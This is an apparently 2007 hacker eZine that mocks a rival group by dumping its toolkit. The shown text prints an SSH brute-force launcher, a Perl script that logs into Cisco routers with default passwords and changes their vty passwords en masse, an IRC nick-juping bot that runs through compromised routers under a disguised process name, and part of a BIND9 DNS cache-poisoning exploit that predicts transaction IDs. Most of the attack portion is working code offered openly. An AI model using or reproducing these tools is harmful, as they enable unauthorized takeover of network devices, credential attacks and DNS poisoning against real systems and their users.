#     # ####### #     #       #    ######  #######    #     # ####### ####### 
 #   #  #     # #     #      # #   #     # #          ##    # #     #    #    
  # #   #     # #     #     #   #  #     # #          # #   # #     #    #    
   #    #     # #     #    #     # ######  #####      #  #  # #     #    #    
   #    #     # #     #    ####### #   #   #          #   # # #     #    #    
   #    #     # #     #    #     # #    #  #          #    ## #     #    #    
   #    #######  #####     #     # #     # #######    #     # #######    #    
                                                                              
   #    #     # ####### #     # #     # #     # ####### #     #  #####  
  # #   ##    # #     # ##    #  #   #  ##   ## #     # #     # #     # 
 #   #  # #   # #     # # #   #   # #   # # # # #     # #     # #       
#     # #  #  # #     # #  #  #    #    #  #  # #     # #     #  #####  
####### #   # # #     # #   # #    #    #     # #     # #     #       # 
#     # #    ## #     # #    ##    #    #     # #     # #     # #     # 
#     # #     # ####### #     #    #    #     # #######  #####   #####  

Y88b   d88P  .d88888b.  888     888           d8888 8888888b.  8888888888 
 Y88b d88P  d88P"" ""Y88b 888     888          d88888 888   Y88b 888        
  Y88o88P   888     888 888     888         d88P888 888    888 888        
   Y888P    888     888 888     888        d88P 888 888   d88P 8888888    
    888     888     888 888     888       d88P  888 8888888P""  888        
    888     888     888 888     888      d88P   888 888 T88b   888        
    888     Y88b. .d88P Y88b. .d88P     d8888888888 888  T88b  888        
    888      ""Y88888P""   ""Y88888P""     d88P     888 888   T88b 8888888888 
                                                                          
                                                                          
                                                                          
888b    888  .d88888b. 88888888888 
8888b   888 d88P"" ""Y88b    888     
88888b  888 888     888    888     
888Y88b 888 888     888    888     
888 Y88b888 888     888    888     
888  Y88888 888     888    888     
888   Y8888 Y88b. .d88P    888     
888    Y888  ""Y88888P""     888     
                                   
                                   
                                   
888      8888888888 .d8888b.  8888888 .d88888b.  888b    888 
888      888       d88P  Y88b   888  d88P"" ""Y88b 8888b   888 
888      888       888    888   888  888     888 88888b  888 
888      8888888   888          888  888     888 888Y88b 888 
888      888       888  88888   888  888     888 888 Y88b888 
888      888       888    888   888  888     888 888  Y88888 
888      888       Y88b  d88P   888  Y88b. .d88P 888   Y8888 
88888888 8888888888 ""Y8888P88 8888888 ""Y88888P""  888    Y888 
 _    _ _   ___   __ ______ ___________ _   _ _____  __   _______ _   _ 
| |  | | | | \ \ / / |  _  \_   _|  _  \ \ | |_   _| \ \ / /  _  | | | |
| |  | | |_| |\ V /  | | | | | | | | | |  \| | | |    \ V /| | | | | | |
| |/\| |  _  | \ /   | | | | | | | | | | . ` | | |     \ / | | | | | | |
\  /\  / | | | | |   | |/ / _| |_| |/ /| |\  | | |     | | \ \_/ / |_| |
 \/  \/\_| |_/ \_/   |___/  \___/|___/ \_| \_/ \_/     \_/  \___/ \___/ 
                                                                        
                                                                        
 _______   ________ _____ _____ _____   _   _ _____ ___  
|  ___\ \ / /| ___ \  ___/  __ \_   _| | | | /  ___|__ \ 
| |__  \ V / | |_/ / |__ | /  \/ | |   | | | \ `--.   ) |
|  __| /   \ |  __/|  __|| |     | |   | | | |`--. \ / / 
| |___/ /^\ \| |   | |___| \__/\ | |   | |_| /\__/ /|_|  
\____/\/   \/\_|   \____/ \____/ \_/    \___/\____/ (_)  

;- TeaMp0isoN: - TriCk - iN^SanE - Hex00010 - MLT -;

----------------------------------------------------
Twitter:
@TeaMp0isoN_
@_TeaMp0isoN_"
Papers,x0x0x #1,eZine,,2007-09-05,: N/A,"#!/local/efnet/el8/pokemon/requers
################################################
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
### x0x0x  x0x0x  x0x0x  x0x0x  x0x0x  x0x0x ###
################################################
#                                              #
#                                              #
#            ÛÛÛÛ             ÛÛÛÛ             #
#           ÛÛ± ÛÛ           ÛÛ± ÛÛ²           #
#  ÛÛÛ  ÛÛ ±ÛÛ  ±Û° °ÛÛ  ÛÛ  ÛÛ  ±ÛÛ °ÛÛ  ÛÛ°  #
#   ÛÛ²ÛÛ  ²ÛÛ  °Û²  °Û²ÛÛ   ÛÛ  °ÛÛ  °Û²ÛÛ°   #
#    ÛÛÛ   ²ÛÛ  °Û±   ÛÛÛ    ÛÛ  °ÛÛ   ÛÛÛ     #
#   °ÛÛÛ±  ±ÛÛ  ±Û°   ÛÛÛ±   ÛÛ  ±ÛÛ   ÛÛÛ±    #
#   ÛÛ°ÛÛ   ÛÛ± ÛÛ   ²Û°ÛÛ   ÛÛ± ÛÛÛ  ²Û°ÛÛ²   #
#  ÛÛ²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ   ÛÛÛÛ   ²Û²  ÛÛ²  #
#                                              #
################################################
#                                              #
#               .: first zine :.               #
#                                              #
#       [ tribute to efnet el8 requers ]       #
#                                              #
#<><><><><><><><><><><><><><><><><><><><><><><>#
#                                              #
#   -= always keeping the secret identify =-   #
#                                              #
#<><><><><><><><><><><><><><><><><><><><><><><>#

    ,                           .::.
     in efnet el8 PokeMon     .;:**'            AMC
                              `                  0
  .:XHHHHk.              db.   .;;.     dH  MX   0
oMMMMMMMMMMM       ~MM  dMMP :MMMMMR   MMM  MR      ~MRMN
QMMMMMb  ""MMX       MMMMMMP !MX' :M~   MMM MMM  .oo. XMMM 'MMM
  `MMMM.  )M> :X!Hk. MMMM   XMM.o""  .  MMMMMMM X?XMMM MMM>!MMP
   'MMMb.dM! XM M'?M MMMMMX.`MMMMMMMM~ MM MMM XM `"" MX MMXXMM
    ~MMMMM~ XMM. .XM XM`""MMMb.~*?**~ .MMX M t MMbooMM XMMMMMP
     ?MMM>  YMMMMMM! MM   `?MMRb.    `""""""   !L""MMMMM XM IMMM
      MMMX   ""MMMM""  MM       ~%:           !Mh."""""" dMI IMMP
      'MMM.                                             IMX
       ~M!M                                             IMP


 . 1n7r0
 . The Reason....
 .. 
 .. 1º. W3 4r3 71r3d 70 533 p4ck375 k1dd135 4nd p30pl3 1f f1nd1n9 70 h4ck3r f0r 7h3r3!
 .. W3 d3c1d3 7h3n 70 3574bl15h x0x0x, w17h 1n73n710n 0f h4ck 7h3s3 ""r3qu3r5"" 4nd p057 z1n35 0n 7h3m, d1vul91n9 17'5 b3l0n91n95.



  /////////////////
 /// Lets play! //
/////////////////




    <<<<<<<<<<     Okay... positive! Geting some tools of LABSEC.............................       >>>>>>>>>>



	-> We get all tools about labsec in different boxs and compact in just one .tar.gz,
	-> and now we will check all files and tools, and show to universe.
	-> KEEEEEEEEEEEEEEEPING LABSEC EL8 POKEMON!!!


~\-> wget http://myhost.com/labsec.tar.gz
--14:07:59--  http://myhost.com/labsec.tar.gz
           => `labsec.tar.gz'
Resolving myhost.com... x0x0x, x0x0x
Connecting to myhost.com|x0x0x|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 51,708,710 (49M) [application/x-gzip]

100%[=================================================================================================================>] 48,708,710     1.06M/s    ETA 00:00

14:11:42 (1.09 MB/s) - `labsec.tar.gz' saved [48708710/48708710]

~\-> tar -xzvf labsec.tar.gz >> /dev/null &
~\-> cd labsec; ls
./           bit/     dnscp.py                  ifstat-1.1.tar.gz  lol         man.tgz            monoxide3/        newnick.tgz           osshchan/
../          brute/   dtb*                      imp*               lotus.c     mcd*               monoxide3.tar.gz  openssh-4.4p1/        osshchan.tar.gz
ans/         bt.tgz   ettercap-NG-0.7.3/        l*                 lpd/        mcd.c              mosdef/           openssh-4.4p1.tgz     shells
artpack.tgz  ciscos/  ettercap-NG-0.7.3.tar.gz  labsec-shells      lpd.tar.gz  metasploit.tar.gz  ms3/              openssh-4.7p1/        zlib.4*
asc/         cl*      flw.c                     lab.tar.gz         manm/       mit.edu            newnick-8.4b/     openssh-4.7p1.tar.gz

~\-> cd ans;ls
./  ../  00-dc.ans  01-duff.ans  01-labsec.ans  01-labsec-t.ans  01-naipe.ans  01-rhythm.ans  02-naipe.ans

~\-> cat 01-labsec.ans


               ÜÜÜÜ       ÜÜÜÜ
               ÜÛÛ        ÜÛß ÜÜÜÜ           ÜÛÜÜÜÜÜ Ü
              ß ÛÛ ÜÜÜÜÜ  ÛÛ Û ÛÛÜÜÜ          ÛÛ ÛÛÛÛ
                ÛÛ  ÜÜÜÛÛ ÛÛ Û ÛÛÜÜÜÜÜ Ü ÜÜÜÜ ÛÛ ÛÛÛÛÛ
                ÛÛ ÛÛ  ÛÛßÛÛßßÛ ÛÛÛÛ ÛÛ ÛÛ Û ÛÛÛ ÛÛÛÛÛ
                ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛÛÛÛÛ ÛÛÜÜÜÛÛÛ ÛÛÛÛÛ
                ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ ÛÛ ÛÛ Û ÛÛ
                ÛÛÜÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ  ÛÛ ÛÛ ÛÛÛ ßßßßßÛß
               ßßßß ßßßßÛ  ßßßß  ÛÛÜÛÛß ßÛÜÜß
                       ßßß      ßßßßßßß ßßßßß




(((((ELEEEEEEEEEEEEET POKEMON)))))






CHECKING BITORNARDO


~\-> cat bst|more
#!/usr/bin/env python

# Written by Bram Cohen
# see LICENSE.txt for license information

from BitTornado import PSYCO
if PSYCO.psyco:
    try:
        import psyco
        assert psyco.__version__ >= 0x010100f0
        psyco.full()
    except:
        pass

from BitTornado.download_bt1 import BT1Download, defaults, parse_params, get_usage, get_response
from BitTornado.RawServer import RawServer, UPnP_ERROR
from random import seed
from socket import error as socketerror
from BitTornado.bencode import bencode
from BitTornado.natpunch import UPnP_test
from threading import Event
from os.path import abspath
from sys import argv, version, stdout
import sys
from sha import sha
from time import strftime
from BitTornado.clock import clock
from BitTornado import createPeerID
from BitTornado.ConfigDir import ConfigDir

assert version >= '2', ""Install Python 2.0 or greater""
try:
    True
except:
    True = 1
    False = 0

PROFILER = False

def hours(n):
    if n == 0:
        return 'complete!'
    try:
        n = int(n)
        assert n >= 0 and n < 5184000  # 60 days
    except:
        return '<unknown>'
    m, s = divmod(n, 60)
    h, m = divmod(m, 60)
    if h > 0:
        return '%d hour %02d min %02d sec' % (h, m, s)
    else:
        return '%d min %02d sec' % (m, s)

class HeadlessDisplayer:
    def __init__(self):
        self.done = False
        self.file = ''
        self.percentDone = ''
        self.timeEst = ''
        self.downloadTo = ''
        self.downRate = ''
        self.upRate = ''
        self.shareRating = ''
        self.seedStatus = ''
        self.peerStatus = ''
        self.errors = []
        self.last_update_time = -1

    def finished(self):
        self.done = True
        self.percentDone = '100'
        self.timeEst = 'Download Succeeded!'
        self.downRate = ''
        self.display()

    def failed(self):
        self.done = True
        self.percentDone = '0'
        self.timeEst = 'Download Failed!'
        self.downRate = ''
        self.display()

    def error(self, errormsg):
        self.errors.append(errormsg)
        self.display()

    def display(self, fractionDone = None, timeEst = None,
            downRate = None, upRate = None, activity = None,
            statistics = None,  **kws):
        if self.last_update_time + 0.1 > clock() and fractionDone not in (0.0, 1.0) and activity is not None:
            return
        self.last_update_time = clock()
        if fractionDone is not None:
            self.percentDone = str(float(int(fractionDone * 1000)) / 10)
        if timeEst is not None:
            self.timeEst = hours(timeEst)
        if activity is not None and not self.done:
            self.timeEst = activity
        if downRate is not None:
            self.downRate = '%.1f kB/s' % (float(downRate) / (1 << 10))
        if upRate is not None:
            self.upRate = '%.1f kB/s' % (float(upRate) / (1 << 10))
        if statistics is not None:
           if (statistics.shareRating < 0) or (statistics.shareRating > 100):
               self.shareRating = 'oo  (%.1f MB up / %.1f MB down)' % (float(statistics.upTotal) / (1<<20), float(statistics.downTotal) / (1<<20))
           else:
               self.shareRating = '%.3f  (%.1f MB up / %.1f MB down)' % (statistics.shareRating, float(statistics.upTotal) / (1<<20), float(statistics.downTo
tal) / (1<<20))
           if not self.done:
              self.seedStatus = '%d seen now, plus %.3f distributed copies' % (statistics.numSeeds,0.001*int(1000*statistics.numCopies))
           else:
              self.seedStatus = '%d seen recently, plus %.3f distributed copies' % (statistics.numOldSeeds,0.001*int(1000*statistics.numCopies))
           self.peerStatus = '%d seen now, %.1f%% done at %.1f kB/s' % (statistics.numPeers,statistics.percentDone,float(statistics.torrentRate) / (1 << 10))
        print '\n\n\n\n'
        for err in self.errors:
            print 'ERROR:\n' + err + '\n'
        print 'saving:        ', self.file
        print 'percent done:  ', self.percentDone
        print 'time left:     ', self.timeEst
        print 'download to:   ', self.downloadTo
        print 'download rate: ', self.downRate
        print 'upload rate:   ', self.upRate
        print 'share rating:  ', self.shareRating
        print 'seed status:   ', self.seedStatus
        print 'peer status:   ', self.peerStatus
        stdout.flush()

    def chooseFile(self, default, size, saveas, dir):
        self.file = '%s (%.1f MB)' % (default, float(size) / (1 << 20))
        if saveas != '':
            default = saveas
        self.downloadTo = abspath(default)
        return default

    def newpath(self, path):
        self.downloadTo = path

def run(params):
    try:
        import curses
        curses.initscr()
        cols = curses.COLS
        curses.endwin()
    except:
        cols = 80

    h = HeadlessDisplayer()
    while 1:
        configdir = ConfigDir('downloadheadless')
        defaultsToIgnore = ['responsefile', 'url', 'priority']
        configdir.setDefaults(defaults,defaultsToIgnore)
        configdefaults = configdir.loadConfig()
        defaults.append(('save_options',0,
         ""whether to save the current options as the new default configuration "" +
         ""(only for btdownloadheadless.py)""))
        try:
            config = parse_params(params, configdefaults)
        except ValueError, e:
            print 'error: ' + str(e) + '\nrun with no args for parameter explanations'
            break
        if not config:
            print get_usage(defaults, 80, configdefaults)
            break
        if config['save_options']:
            configdir.saveConfig(config)

................................................
................................................
................................................
...................BIG CODE.....................
................................................
................................................


............. we will share this complete code!!




~\-> cd brute; ls
./  ../  br2/  br2.tar.gz  host.pl  locaweb/  locaweb.tar.gz

~\-> cd br2;ls
./          sshb103*  sshb116*  sshb129*  sshb141*  sshb154*  sshb167*  sshb18*   sshb192*  sshb205*  sshb33*  sshb46*  sshb59*  sshb71*  sshb84*  sshb97*
../         sshb104*  sshb117*  sshb13*   sshb142*  sshb155*  sshb168*  sshb180*  sshb193*  sshb206*  sshb34*  sshb47*  sshb6*   sshb72*  sshb85*  sshb98*
all*        sshb105*  sshb118*  sshb130*  sshb143*  sshb156*  sshb169*  sshb181*  sshb194*  sshb21*   sshb35*  sshb48*  sshb60*  sshb73*  sshb86*  sshb99*
duh.sh      sshb106*  sshb119*  sshb131*  sshb144*  sshb157*  sshb17*   sshb182*  sshb195*  sshb22*   sshb36*  sshb49*  sshb61*  sshb74*  sshb87*
orb*        sshb107*  sshb12*   sshb132*  sshb145*  sshb158*  sshb170*  sshb183*  sshb196*  sshb23*   sshb37*  sshb5*   sshb62*  sshb75*  sshb88*
ptscan.dat  sshb108*  sshb120*  sshb133*  sshb146*  sshb159*  sshb171*  sshb184*  sshb197*  sshb24*   sshb38*  sshb50*  sshb63*  sshb76*  sshb89*
sc*         sshb109*  sshb121*  sshb134*  sshb147*  sshb16*   sshb172*  sshb185*  sshb198*  sshb25*   sshb39*  sshb51*  sshb64*  sshb77*  sshb9*
ss*         sshb11*   sshb122*  sshb135*  sshb148*  sshb160*  sshb173*  sshb186*  sshb199*  sshb26*   sshb4*   sshb52*  sshb65*  sshb78*  sshb90*
sshb0*      sshb110*  sshb123*  sshb136*  sshb149*  sshb161*  sshb174*  sshb187*  sshb2*    sshb27*   sshb40*  sshb53*  sshb66*  sshb79*  sshb91*
sshb1*      sshb111*  sshb124*  sshb137*  sshb15*   sshb162*  sshb175*  sshb188*  sshb20*   sshb28*   sshb41*  sshb54*  sshb67*  sshb8*   sshb92*
sshb10*     sshb112*  sshb125*  sshb138*  sshb150*  sshb163*  sshb176*  sshb189*  sshb201*  sshb29*   sshb42*  sshb55*  sshb68*  sshb80*  sshb93*
sshb100*    sshb113*  sshb126*  sshb139*  sshb151*  sshb164*  sshb177*  sshb19*   sshb202*  sshb3*    sshb43*  sshb56*  sshb69*  sshb81*  sshb94*
sshb101*    sshb114*  sshb127*  sshb14*   sshb152*  sshb165*  sshb178*  sshb190*  sshb203*  sshb30*   sshb44*  sshb57*  sshb7*   sshb82*  sshb95*
sshb102*    sshb115*  sshb128*  sshb140*  sshb153*  sshb166*  sshb179*  sshb191*  sshb204*  sshb31*   sshb45*  sshb58*  sshb70*  sshb83*  sshb96*

// ripped bruteforce

~\-> cat duh.sh
#!/bin/sh
# SHELLSCRIPT PARA FAZER O XUPETA SSH RODA JeRAL
# CODADO POR klux@efnet klux@LABSEC
echo ""Escreva o nome do arquivo: ""
read file;
echo ""Escreva a quantidade de arquivos: ""
read qtidade;
echo ""Arquivo xupeta pra roda jeral flw: ""
read nomeresult;
for ((d=1 ; d <= $qtidade; d++)); do
echo ""./$file$d"" -brute '$1' >> $nomeresult ;
done



(((((((((((((( OFMGGGGGG GOOOOOOOOOOOOOOOOOD CODE MAN!!! LOLLLLLLL ))))))))))))))






~\-> cd ../ciscos;ls

./  ../  ciscos.txt  lep.pl  names.txt  pressure2.pl  pressure.pl  readme  servers.txt

~\-> cat lep.pl
#!/usr/bin/perl

#
# LEPARKOUR I by labsec@efnet (LsC)
# CISCO/ROUTER MASS PASSWD CHANGER
#

use Net::Telnet::Cisco;

# usar em background: 0
# usar em foreground: 1
# um mostra as coisas na tela(1) e o outro nao(0) eh isso e ja era
use constant DEBUG => 1;

# senha cisco padrao
my $padrao = ""cisco"";
# senha cisco para alterar
my $mudar = ""cisco"";

# nao mexer
my $i = 0;
my $deu = 0;

my $ARGC = @ARGV;

my $banner = ""\nLEPARKOUR I. by LsC [CISCO/ROUTER MASS PASSWD CHANGER]\n"";

if ($ARGC !=1) {
        print $banner;
        print ""Usage: $0 [list.txt]\n\n"";
        exit;
}

print $banner;

open (""arq"", ""$ARGV[0]"") or die(""[LABSEC] $ARGV[0] nao encontrado\n"");
@linhas = (<arq>);

foreach $linha (@linhas) {
        chomp(@linhas);
        if (DEBUG == 1) { print ""\n[+] Tentando $linha:23 ($i/$#linhas)\n""; }
        if (my $session = Net::Telnet::Cisco->new(Host => $linha, Timeout  => '5', Errmode => ""return"")) {
                $session->errmode(""return"");

                if ($session->login(Password => $padrao, Timeout  => '5')) {
                        if (DEBUG == 1) { print ""[+] Aceito a senha..\n""; }

                        if ($session->enable($padrao)) {
                            $session->cmd('configure terminal');
                                $session->cmd('line vty 0 4');
                                $session->cmd('password '.$mudar);
                                $session->cmd('exit');
                                $session->cmd('exit');
                                my @out = $session->cmd('copy run start');
#                               $session->cmd('startup-config');
                                foreach (@out) {
                                        if ($_ =~ /OK/ig) {
                                                if (DEBUG == 1) { print ""[+] >> $linha:23 deu certo manow\n""; }
                                                system(""echo "".$linha."" >> alterados.txt"");
                                                $deu++;
                                        }
                                }
                        } else {
                            if (DEBUG == 1) { print ""[-] Erro (enable): Senha errada?\n""; }
                                $erro++;
                        }
                } else {
                    if (DEBUG == 1) { print ""[-] Erro: Senha padrao errada?\n""; }
                        $erro++;
                }

                $session->close;

        } else {
            if (DEBUG == 1) { print ""[-] Erro: Cisco offline.\n""; }
                $erro++;
        }
        $i++;
}

close(""arq"");

if (DEBUG == 1) {
        print qq~\nFim!
Total de ciscos com senhas alteradas: $deu
Total de ciscos com erro de senha no enable: $erro\n~;
}


=======
=== For this reason this is a el8 pokemon group!!!!
=== Check the next lame kid code.. LOLLLLLLLLLLLLLL
=======


~\-> cat pressure2.pl
#!/usr/bin/perl
# [LsC] pressure
# [LsC] cisco+irc juper
# beta 1
# i dont want kids ripping, so im gonna use perl2exe.
# by klux

$SIG{HUP}  = 'IGNORE';
$SIG{PS}   = 'IGNORE';
$SIG{TERM} = 'IGNORE';
$SIG{CHLD} = sub { wait; };


$ARGC=@ARGV;

my $pid = fork();
die ""ERROR: I could not fork() the process."" unless defined($pid);
exit if $pid;

if ($ARGC !=1) {
print ""PRESSURE I. by LsC [CISCO/ROUTER JupeNet - IRC Nick Juper]\n"";
print ""LICENSED and CONFIGURED to: klux\n"";
print ""Usage: pressure [target]\n"";
print ""       names.txt            <used to nick, ident and realname>\n"";
print ""       ciscos.txt           <your cisco ips here>\n"";
print ""       servers.txt          <irc servers>\n"";
print ""PRESSURE is private, if you want pressure, #lsc at efnet.\n"";
exit(1);
}

my $senha=""reef666"";
my $port=""6667"";
my $chan=""#lala"";
my $senhachan=""rem"";
my $owner= ""klux"";
my $procname=""proftpd: [IDLE]"";

$0 =  $procname  . ""\0"";
$target = $ARGV[0] if ($ARGV[0]);
$id =""$ident"".int rand(20);
$0 =  $procname  . ""\0"";
$chan = '#'.$chan if ($chan !~ /^\#/);

$nick =  retorna_nomes();
$nick2 =  retorna_ident();
$cisco = retorna_ciscos();
$server = retorna_servers();
$name = retorna_realn();
$ident = retorna_ident();
$nick3 = ""$nick"".int rand(20);
$nick4 = ""$nick2"".int rand(20);

use IO::Socket;
 $sock=IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=> $cisco, PeerPort=> 23);
        print $sock """".$senha.""\n"";
        print $sock ""telnet "".$server."" "".$port.""\n"";
        print $sock ""NICK "".$nick.""\n"";
        print $sock ""USER "".$ident."" LsC LsC :"".$name.""\n"";

while (<$sock>) {

        print;
        if (/^:.+?\s433\s/) { # nick already in use
            print $sock ""NICK "".$nick4.""\n"";
        }
        if (/^:.+?\s376\s/) { # end of motd
            print $sock ""PRIVMSG "".$owner."" : [LsC] PRESSURE  :  connected to $server:$port\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] TARGET    :  pointed to $target\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !HELP     :  for help\n"";
            print $sock ""JOIN "".$chan."" "".$senhachan."" : ENTRANDO NO CANAL\n"";
        }

        if(/^PING :(.*)/){ #replying the ping
            print $sock ""PONG :$1\n"";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:!raw (.*)/){
            print $sock ""$1"";
        }
        if(/^\:$owner!.*\@.*PRIVMSG.*:!help(.*)/){
            print $sock ""PRIVMSG "".$owner."" : [LsC] !RAW\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !MSG\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !OWNER  :  nick\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !TARGET :  nick\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !QUIT\n"";
            print $sock ""PRIVMSG "".$owner."" : [LsC] !STATS\n"";

      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!msg(.*)/){
            print $sock ""PRIVMSG "".$1."" : "".$2.""\n"";
      }
      if(/^\:$target!.*\@.*QUIT.*(.*)/){
            print $sock ""NICK "".$target.""\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] TARGET has been taken.\n"";
      }
       if(/^\:$target!.*\@.*NICK.*(.*)/){
            print $sock ""NICK "".$target.""\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] TARGET has been taken.\n"";
      }

      if(/^ERROR :(.*)/){
        print $sock ""telnet "".$server."" "".$port.""\n"";
        print $sock ""NICK "".$nick.""\n"";
        print $sock ""USER "".$ident."" LsC LsC : "".$name.""\n"";
      }

      if(/^\:$owner!.*\@.*PRIVMSG.*:!quit(.*)/){
            die ""[LsC] ultimate jupe teknology\n"";
      }
      if(/^\:.*: Connection timed out(.*)/){
            print STDOUT ""[LsC] CONNECTION timed out (DDOS?). Reconnecting\n"";
        print $sock ""telnet "".$server."" "".$port.""\n"";
        print $sock ""NICK "".$nick.""\n"";
        print $sock ""USER "".$id."" LsC LsC : "".$name.""\n"";
        print $sock ""PRIVMSG "".$owner."" : [LsC] CONNECTION has timed out... DDOS ? r3r3r3"";
      }
      if(/^\:$owner!.*\@.*PRIVMSG.*:!stats(.*)/){
            print $sock ""PRIVMSG "".$owner."" :[LsC] PRESSURE Stats\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] SERVER : $server\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] PORT   : $port\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] TARGET : $target\n"";
            print $sock ""PRIVMSG "".$owner."" :[LsC] OWNER  : $owner\n"";
            print $sock ""PRIVMSG "".$chan."" :[LsC] TARGET is $target\n"";
            }

      if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!target\s+(.*)/ ){
             $target =$1;
             $target =~ s/ //;
             $target =~ s/\r$//;
             $target =~ s/\n$//;

             print $sock ""PRIVMSG "".$owner."" :[LsC] TARGET  :  pointed to $target\n"";
     }

     if(/^\:$secc!.*\@.*PRIVMSG.*:!escap(.*)/){
            print $sock ""$1"";
       }
       if(/^\:$target!.*\@.*\s+QUIT\s+/){
             print $sock ""NICK $target\n"";
       }
       if( /^\:$owner!.*\@.*\s+PRIVMSG.*:!owner\s+(.*)/ ){
             $owner =$1;
             $owner =~ s/ //;
             $owner =~ s/\r$//;
             $owner =~ s/\n$//;

             print $sock ""PRIVMSG "".$owner."" :[LsC] PRESSURE\n"";
             print $sock ""PRIVMSG "".$owner."" :[LsC] TRY !HELP\n"";
              }
   }

sub retorna_nomes
{
        open (a, ""names.txt"") or die(""[LsC] names.txt not found\n"");
        @linhas = (<a>);
        chomp(@linhas);
        $n = int(rand(@linhas));
        close(a);
        return @linhas[$n];
}
sub retorna_ciscos
{
        open (a, ""ciscos.txt"") or die(""[LsC] ciscos.txt not found\n"");
        @linhas = (<a>);
        chomp(@linhas);
        $n = int(rand(@linhas));
        close(a);
        return @linhas[$n];
}
sub retorna_servers
{
        open (a, ""servers.txt"") or die(""[LsC] servers.txt not found\n"");
        @linhas = (<a>);
        chomp(@linhas);
        $n = int(rand(@linhas));
        close(a);
        return @linhas[$n];
}
sub retorna_realn
{
        open (a, ""names.txt"") or die(""[LsC] names.txt not found\n"");
        @linhas = (<a>);
        chomp(@linhas);
        $n = int(rand(@linhas));
        close(a);
        return @linhas[$n];
}
sub retorna_ident
{
        open (a, ""names.txt"") or die(""[LsC] names.txt not found\n"");
        @linhas = (<a>);
        chomp(@linhas);
        $n = int(rand(@linhas));
        close(a);
        return @linhas[$n];
}





********************************************************
*************** NAMED EXPLOIT !?!?!?!? *****************
********************************************************


\-> cat dnscp.py
#!/usr/bin/env python

""""""
DNS Cache Poison v0.3beta by posedge / Coromputer
http://www.coromputer.net/

based on the Amit Klein paper: http://www.trusteer.com/docs/bind9dns.html

output: <time>:<ip>:<port>: id: <id> q: <query> g: <good> e: <error>

id: ID to predict
q: number of queries from the DNS server (only queries with LSB at 0 in ID)
g: number of good predicted IDs
e: number of errors while trying to predict a *supposed to be* predicted ID
""""""

import socket, select, sys, time
from struct import unpack, pack
from socket import htons

_ANSWER_TIME_LIMIT = 1.0 # 1sec
_NAMED_CONF = [['ns2.globalwebhost.com','63.210.101.2'], \
               ['ns2.globalwebhost.com','63.210.101.2'], \
               ['0','0']]

class BINDSimplePredict:
  def __init__(self, txid, bind_9_2_3___9_4_1=True):
    self.txid = txid
    self.cand = []
    if bind_9_2_3___9_4_1 == True:
      # For BIND9 v9.2.3-9.4.1:
      self.tap1=0x80000057
      self.tap2=0x80000062
    else:
      # For BIND9 v9.0.0-9.2.2:
      self.tap1=0xc000002b # (0x80000057>>1)|(1<<31)
      self.tap2=0xc0000061 # (0x800000c2>>1)|(1<<31)
    self.next = self.run()
    return

  def run(self):

    if (self.txid & 1) != 0:
      #print ""info: LSB is not 0. Can't predict the next transaction ID.""
      return False

    #print ""info: LSB is 0, predicting...""

    # One bit shift (assuming the two lsb's are 0 and 0)
    for msb in xrange(0, 2):
      self.cand.append(((msb<<15)|(self.txid>>1)) & 0xFFFF)

    # Two bit shift (assuming the two lsb's are 1 and 1)
    # First shift (we know the lsb is 1 in both LFSRs):
    v=self.txid
    v=(v>>1)^self.tap1^self.tap2
    if (v & 1) == 0:
      # After the first shift, the lsb becomes 0, so the two LFSRs now have
      #  identical lsb's: 0 and 0 or 1 and 1
      #  Second shift:
      v1=(v>>1) # 0 and 0
      v2=(v>>1)^self.tap1^self.tap2 # 1 and 1
    else:
      # After the first shift, the lsb becomes 1, so the two LFSRs now have
      # different lsb's: 1 and 0 or 0 and 1
      # Second shift:
      v1=(v>>1)^self.tap1 # 1 and 0
      v2=(v>>1)^self.tap2 # 0 and 1

    # Also need to enumerate over the 2 msb's we are clueless about
    for msbits in xrange(0, 4):
      self.cand.append(((msbits<<14)|v1) & 0xFFFF)
      self.cand.append(((msbits<<14)|v2) & 0xFFFF)

    return True;

class DNSData:
  def __init__(self, data):
    self.data=data
    self.name=''

    for i in xrange(12, len(data)):
      self.name+=data[i]
      if data[i] == '\x00':
        break
    q_type = unpack("">H"", data[i+1:i+3])[0]
    if q_type != 1: # only type: A (host address) allowed.
      self.name = None
    return

  def response(self, ip=None):
    packet=''
    packet+=self.data[0:2] # id
    packet+=""\x84\x10"" # flags
    packet+=""\x00\x01"" # questions
    packet+=""\x00\x01"" # answer RRS
    packet+=""\x00\x00"" # authority RRS
    packet+=""\x00\x00"" # additional RRS
    packet+=self.name # queries: name
    packet+=""\x00\x01"" # queries: type (A)
    packet+=""\x00\x01"" # queries: class (IN)
    packet+=""\xc0\x0c"" # answers: name
    if ip == None:
      packet+=""\x00\x05"" # answers: type (CNAME)
      packet+=""\x00\x01"" # answers: class (IN)
      packet+=""\x00\x00\x00\x01"" # answers: time to live (1sec)
      packet+=pack("">H"", len(self.name)+2) # answers: data length
      packet+=""\x01"" + ""x"" + self.name # answers: primary name
    else:
      packet+=""\x00\x01"" # answers: type (A)
      packet+=""\x00\x01"" # answers: class (IN)
      packet+=""\x00\x00\x00\x01"" # answers: time to live (1sec)
      packet+=""\x00\x04"" # answers: data length
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # IP
    #packet+=""\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00"" # Additional
    return packet

class DNSServer:
  def __init__(self):
    self.is_r = []
    self.is_w = []
    self.is_e = []
